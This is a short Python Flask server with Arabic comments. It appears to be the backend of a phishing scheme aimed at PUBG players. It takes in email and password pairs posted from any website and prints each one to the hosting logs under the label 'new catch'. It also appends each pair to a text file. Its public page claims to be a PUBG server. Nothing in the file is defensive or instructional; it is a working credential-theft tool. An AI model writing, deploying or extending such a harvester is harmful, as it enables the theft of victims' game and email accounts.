from flask import Flask, request, make_response
import datetime
import os

app = Flask(__name__)

# دالة لحفظ البيانات في ملف (اختياري في السحاب) وطباعتها في السجلات
def save_and_log(email, password):
    time_now = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    log_entry = f"Time: {time_now} | Email: {email} | Pass: {password}"
    
    # 1. طباعة في الـ Logs (ستراها في موقع Render)
    print(f"\n\033[92m[+] صيد جديد وصل الآن:\033[0m")
    print(f"\033[94m{log_entry}\033[0m")
    print("-" * 50)
    
    # 2. حفظ في ملف نصي داخل السيرفر
    with open("database.txt", "a", encoding="utf-8") as f:
        f.write(log_entry + "\n" + ("-" * 50) + "\n")

@app.route('/', methods=['POST', 'OPTIONS', 'GET'])
def get_data():
    # حل مشكلة الـ CORS للمتصفحات العالمية
    if request.method == 'OPTIONS':
        response = make_response()
        response.headers.add("Access-Control-Allow-Origin", "*")
        response.headers.add('Access-Control-Allow-Headers', "Content-Type")
        response.headers.add('Access-Control-Allow-Methods', "POST")
        return response

    if request.method == 'GET':
        return "<h1>PUBG Server is Online 24/7</h1>"

    # استلام البيانات
    data = request.json
    if data:
        email = data.get('email')
        password = data.get('pass')
        save_and_log(email, password)

    response = make_response("OK", 200)
    response.headers.add("Access-Control-Allow-Origin", "*")
    return response

# تشغيل الخادم
if __name__ == '__main__':
    # الاستضافة تختار المنفذ تلقائياً، وإذا لم تجد تستخدم 5000
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)
